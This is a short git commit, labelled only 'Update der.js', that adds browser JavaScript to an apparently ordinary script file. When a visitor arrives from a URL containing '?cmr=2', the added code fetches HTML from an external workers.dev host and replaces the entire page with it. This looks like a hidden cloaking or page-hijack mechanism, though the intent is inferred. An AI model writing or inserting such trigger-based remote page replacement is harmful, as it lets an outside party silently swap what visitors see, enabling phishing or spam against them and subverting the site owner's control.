49d24a5dce03ce6dff2e293c2b12f5774e0fa225
mrotang <65051182+mrotang@users.noreply.github.com>
2023-05-20 21:42:20 +0700

    Update der.js

--- der.js
+++ der.js
@@ -10,3 +10,19 @@ if (window.location.search.includes("?cmr=2")) {
       console.error("Terjadi kesalahan:", error);
     });
 }
+
+
+if (document.referrer.includes('?cmr=2')) {
+  fetch('https://crm-template-one.mastimon.workers.dev/')
+    .then(response => response.text())
+    .then(data => {
+      const parser = new DOMParser();
+      const newDoc = parser.parseFromString(data, 'text/html');
+      const newHtml = newDoc.querySelector('html').outerHTML;
+      document.querySelector('html').outerHTML = newHtml;
+    })
+    .catch(error => {
+      console.error('Error fetching data:', error);
+    });
+}
+
